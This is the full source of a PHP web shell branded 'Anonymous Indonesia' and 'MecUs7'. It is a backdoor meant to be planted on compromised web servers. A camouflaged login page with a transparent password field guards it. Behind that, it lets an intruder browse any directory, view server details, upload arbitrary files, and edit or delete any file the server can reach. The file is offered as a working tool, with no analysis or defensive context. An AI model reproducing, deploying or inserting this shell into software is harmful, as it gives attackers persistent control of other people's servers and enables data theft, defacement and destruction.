<?php
set_time_limit(0);
error_reporting(0);
$auth_pass ="641c05c76565c1e0353068f50e384a80";
if(get_magic_quotes_gpc()) {   
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die("<html>
  <head>
  <title>Powered by MecUs7</title>
  </head>
  <style>html{background-color;transparent;color:black;}input{background-color:transparent;box-shadow: 0 0 10px transparent;color:transparent;border-color:transparent;}</style>
  <body>
<style>
body
        {
            background-image: url('https://i.ibb.co/kG6v6gv/Panda7w7-20230615-121734.jpg');');
        }
</style>
  <br>
  <h1><center></h1><br></center><center><b>Powered by MecUs7</b></center><center><form method='post'><input style='text-align:center;' type='password' name='pass'></form>
 ");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
$dir = isset($_GET['dir']) ? hex2bin($_GET['dir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file) {
    return is_writable($file);
}

if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $dir . '/' . $_FILES['file_upload']['name'])) {
        $upload_message = 'File berhasil diunggah.';
    } else {
        $upload_message = 'Gagal mengunggah file.';
    }
}

if (isset($_POST['edit_file'])) {
    $file = $_POST['edit_file'];
    $content = file_get_contents($file); // membaca isi file yang ingin diedit
    if ($content !== false) {
        echo '<form method="post" action="">'; // buat form baru untuk menampilkan textarea dan tombol Submit
        echo '<textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>';
        echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '">';
        echo '<button type="submit" name="submit_edit" class="btn btn-outline-light">Submit</button>';
        echo '</form>';
    } else {
        $edit_message = 'Gagal membaca isi file.';
    }
}

if (isset($_POST['submit_edit'])) {
    $file = $_POST['edited_file'];
    $content = $_POST['file_content'];
    if (file_put_contents($file, $content) !== false) {
        $edit_message = 'File berhasil diedit.';
    } else {
        $edit_message = 'Gagal mengedit file.';
    }
}

if (isset($_POST['delete_file'])) {
    $file = $_POST['delete_file'];
    if (unlink($file)) {
        $delete_message = 'File berhasil dihapus.';
    } else {
        $delete_message = 'Gagal menghapus file.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Anonymous Indonesia</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            font-weight: bold;
        }
        a {
            text-decoration : none;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 0.4rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            width: 70%;
            margin-left: auto;
            margin-right: auto;
            margin-top: 1rem;
        }
        th, td {
            border: 2px solid #000;
            padding: 0.2rem 0.2rem;
            border-radius: 3px;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        button {
            border-radius: 3px;
            margin-left: 0.2rem;
            margin-right: 0.2rem;
        }
        button:hover {
            background-color: silver;
        }
        textarea {
            width: 95%;
            padding: 0.4rem;
            margin: 0.4rem;
        }
        input[type="submit"] {
            background-color: #efefef;
            border: 1.5px solid #000; 
            color: #000;
            cursor: pointer;
            padding: 0.1rem 0.5rem;
            text-align: center;
            text-decoration: none;
            border-radius: 3px;
            display: inline-block;
            font-size: smaller;
        }
        input[type="submit"]:hover {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <header>
        <h1>Anonymous Indonesia</h1>
    </header>
    <main>
        <p>Current directory: <?php echo $current_dir; ?></p>
        <p>Server information: <?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <label>Upload file:</label>
            <input type="file" name="file_upload">
            <input type="submit" value="Upload">
            <input type="hidden" name="dir" value="<?php echo $dir; ?>">
        </form>
        <table>
            <tr>
                <th>Filename</th>
                <th>Permissions</th>
                <th>Actions</th>
</tr>
<?php foreach ($files as $file): ?>
<tr>
    <td style="text-align: left;padding-left: 0.5rem;">
        <?php if (is_dir($dir . '/' . $file)): ?>
        <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"
            style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
        <?php else: ?>
        <span style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></span>
        <?php endif; ?>
    </td>
    <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
        <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
    </td>
    <td>
        <?php if (is_file($dir . '/' . $file)): ?>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
            <p><button type="submit" class="btn btn-outline-light">Edit</button></p>
        </form>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
            <p><button type="submit" class="btn btn-outline-light">Delete</button></p>
        </form>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</table>
</main>
</body>
</html>
